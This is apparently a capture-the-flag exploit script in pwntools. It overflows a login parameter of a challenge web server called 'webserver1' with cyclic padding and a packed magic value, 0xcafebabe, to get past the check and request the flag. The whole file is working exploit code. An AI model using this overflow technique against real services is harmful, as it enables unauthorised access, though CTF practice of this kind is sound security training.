from pwn import *

if args.REMOTE:
    p = remote("pwn.ctf.makerforce.io", 4011)
else:
    p = process("./webserver1")

p.sendline("GET /login/?user=" + cyclic(0x10) + p32(0xcafebabe) + " HTTP/1.1");
p.sendline("GET /flag/1 HTTP/1.1")
p.interactive();
